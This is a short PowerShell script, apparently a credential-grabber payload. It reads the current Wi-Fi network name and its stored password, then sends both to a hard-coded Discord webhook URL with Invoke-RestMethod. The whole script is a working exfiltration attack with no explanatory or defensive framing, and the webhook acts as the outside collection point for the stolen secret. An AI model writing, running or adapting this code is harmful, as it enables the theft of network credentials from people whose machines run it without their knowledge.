# Variables
$WifiSSID = (Get-WifiConfiguration).SSID
$WifiKey = (Get-WifiConfiguration).KeyMaterial[0]
$DiscordWebhookURL = "https://discord.com/api/webhooks/1347662704709472407/9ohSSgF-GCi4B_O5wmmrB0OVZXGO7D8zxEMfDxctVUpgXyI5IlNZ9c-EDgAm7hQEybra"

# Prepare the payload
$payload = @{
    "content" = "Wi-Fi SSID: $WifiSSID
Wi-Fi Password: $WifiKey"
}

# Send the payload to Discord webhook
Invoke-RestMethod -Uri $DiscordWebhookURL -Method POST -Body $payload
